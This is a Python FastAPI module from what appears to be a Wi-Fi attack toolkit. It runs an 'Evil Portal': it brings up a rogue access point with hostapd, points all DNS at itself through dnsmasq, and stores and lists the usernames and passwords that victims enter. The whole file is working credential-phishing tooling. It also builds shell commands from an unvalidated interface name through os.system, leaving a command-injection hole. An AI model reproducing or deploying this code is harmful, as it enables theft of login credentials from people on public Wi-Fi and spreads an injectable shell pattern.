import os
import subprocess
import threading
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import Optional
from core.database import db
from api.websocket import log_sync

router = APIRouter()

# State
_portalstate = {
    "running": False,
    "essid": None,
    "hostapd_proc": None,
    "dnsmasq_proc": None,
}


class PortalRequest(BaseModel):
    essid: str
    channel: int = 6
    interface: str
    password: Optional[str] = None
    template: str = "templates/default_portal.html"


class CredentialRequest(BaseModel):
    username: str
    password: str
    ip_address: Optional[str] = None


@router.post("/start")
async def start_portal(req: PortalRequest):
    if _portalstate["running"]:
        raise HTTPException(status_code=400, detail="El portal ya está en ejecución")

    # Generar config hostapd
    hostapd_conf = f"""interface={req.interface}
driver=nl80211
ssid={req.essid}
hw_mode=g
channel={req.channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    if req.password:
        hostapd_conf += f"""wpa=2
wpa_passphrase={req.password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""

    conf_path = "/tmp/wifipwn_hostapd.conf"
    with open(conf_path, "w") as f:
        f.write(hostapd_conf)

    # Generar config dnsmasq
    dnsmasq_conf = f"""interface={req.interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.1.1
"""
    dnsmasq_path = "/tmp/wifipwn_dnsmasq.conf"
    with open(dnsmasq_path, "w") as f:
        f.write(dnsmasq_conf)

    try:
        # Configurar IP
        os.system(f"ip addr add 192.168.1.1/24 dev {req.interface} 2>/dev/null")
        os.system(f"ip link set {req.interface} up")

        hostapd_proc = subprocess.Popen(
            ["hostapd", conf_path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_path, "--no-daemon"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )

        _portalstate["running"]      = True
        _portalstate["essid"]        = req.essid
        _portalstate["hostapd_proc"] = hostapd_proc
        _portalstate["dnsmasq_proc"] = dnsmasq_proc

        db.log_action("Evil Portal iniciado", f"ESSID: {req.essid} Interfaz: {req.interface}")
        log_sync(f"Evil Portal activo: {req.essid}", "success", "evil_portal")
        return {"success": True, "essid": req.essid}

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/stop")
async def stop_portal():
    for key in ("hostapd_proc", "dnsmasq_proc"):
        proc = _portalstate.get(key)
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try: proc.kill()
                except Exception: pass
            _portalstate[key] = None

    _portalstate["running"] = False
    _portalstate["essid"]   = None
    db.log_action("Evil Portal detenido")
    return {"success": True}


@router.get("/status")
async def portal_status():
    return {
        "running": _portalstate["running"],
        "essid":   _portalstate["essid"],
    }


@router.post("/credential")
async def add_credential(req: CredentialRequest):
    cid = db.add_credential(
        source="evil_portal",
        username=req.username,
        password=req.password,
        ip_address=req.ip_address,
    )
    log_sync(f"Credencial capturada: {req.username}", "warning", "evil_portal")
    return {"id": cid}


@router.get("/credentials")
async def get_credentials():
    return db.get_credentials()
